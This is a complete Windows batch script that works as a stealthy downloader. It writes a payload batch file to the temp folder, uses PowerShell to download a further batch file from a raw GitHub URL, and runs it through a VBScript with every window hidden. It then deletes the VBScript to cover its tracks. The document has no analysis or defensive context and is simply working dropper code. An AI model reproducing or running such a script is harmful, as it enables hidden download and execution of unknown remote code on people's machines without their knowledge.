@echo off
setlocal EnableDelayedExpansion

:: Define paths
set "vbs=%temp%\run_hidden.vbs"
set "payload=%temp%\payload.bat"
set "remote_bat_url=https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/output.bat"
set "downloaded_bat=%temp%\downloaded.bat"

:: Create payload.bat (downloads the remote .bat and runs it hidden)
(
    echo @echo off
    echo powershell -Command "try { Invoke-WebRequest -Uri '!remote_bat_url!' -OutFile '!downloaded_bat!' -ErrorAction Stop } catch { exit /b 1 }"
    echo powershell -WindowStyle Hidden -Command "Start-Process '!downloaded_bat!' -WindowStyle Hidden"
) > "!payload!"

:: Confirm payload.bat was written
if not exist "!payload!" (
    echo Failed to create payload.bat
    exit /b
)

:: Write the VBScript to run payload.bat hidden
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run chr(34) ^& "!payload!" ^& chr(34), 0
    echo Set WshShell = Nothing
) > "!vbs!"

:: Confirm VBScript exists
if not exist "!vbs!" (
    echo Failed to create VBScript
    exit /b
)

:: Execute the VBScript to run the payload hidden
cscript //nologo "!vbs!"

:: Clean up
del /f /q "!vbs!"
:: del /f /q "!payload!"
:: del /f /q "!downloaded_bat!"

endlocal
exit
